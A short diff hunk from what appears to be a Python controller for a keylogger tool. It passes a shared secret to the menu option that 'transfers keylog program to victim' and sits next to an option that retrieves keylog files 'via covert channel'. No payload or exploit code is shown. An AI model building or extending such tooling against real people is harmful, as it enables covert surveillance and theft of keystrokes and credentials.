@@ -54,7 +54,7 @@ if __name__ == '__main__':
 
                 # MENU ITEM 3 - Transfer keylog program to victim
                 if command == constants.PERFORM_MENU_ITEM_THREE:
-                    perform_menu_item_3(connected_clients)
+                    perform_menu_item_3(connected_clients, shared_secret)
 
                 # MENU ITEM 4 - Get Keylog File(s) from Victim (via. covert channel)
                 if command == constants.PERFORM_MENU_ITEM_FOUR:
